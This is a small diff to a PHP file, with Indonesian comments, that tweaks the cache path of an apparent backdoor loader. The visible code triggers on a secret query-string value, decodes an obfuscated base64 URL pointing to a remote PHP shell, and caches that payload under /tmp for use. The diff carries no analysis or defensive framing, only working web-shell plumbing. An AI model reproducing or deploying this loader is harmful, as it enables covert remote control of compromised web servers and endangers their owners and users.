@@ -4,7 +4,7 @@ if ($_SERVER['QUERY_STRING'] === 'JandaPirangAbang') {
     // ✅ GANTI INI AJA BRO!
     // ---------------------
     $REMOTE_SHELL_URL = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzVZNEgvc2VvL21haW4vc2VvYmFyYmFyLnBocA==');
-    $LOCAL_CACHE_DIR  = '/tmp';  // ganti ke path lain kalau mau, contoh: __DIR__ . '/.cache'
+    $LOCAL_CACHE_DIR  = '/tmp/';  // ganti ke path lain kalau mau, contoh: __DIR__ . '/.cache'
     // ---------------------
 
     // 🔐 Nama file acak tapi tetap (berbasis lokasi file & OS)
